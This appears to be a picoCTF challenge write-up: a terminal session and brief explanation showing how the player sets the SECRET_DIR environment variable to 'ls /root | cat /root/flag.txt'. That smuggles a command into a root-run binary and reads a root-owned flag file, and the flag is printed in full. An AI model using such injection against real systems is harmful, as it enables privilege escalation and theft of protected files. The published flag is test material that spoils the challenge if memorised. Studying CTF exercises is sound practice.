```bash
$ ssh ctf-player@saturn.picoctf.net -p 63842
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.19.0-1024-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ export SECRET_DIR="/root"
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
ctf-player@pico-chall$ export SECRET_DIR="ls /root | cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of ls /root | cat /root/flag.txt as root: 
picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}ls: cannot access 'ls': No such file or directory
ctf-player@pico-chall$ 
```

In this challenge, we need to run bin
It says SECRET_DIR is not set

Since in the question it tells that bin lists directories as root, we set SECRET_DIR to root
export SECRET_DIR="/root"
Then we see that there is a flag.txt

Now we change SECRET_DIR to ls  /root | cat /root/flag.txt as cat works only if ls works
So we first list what is in root then pipe it to cat
export SECRET_DIR="ls /root | cat /root/flag.txt"
Then we get the flag

**FLAG - `picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}`**

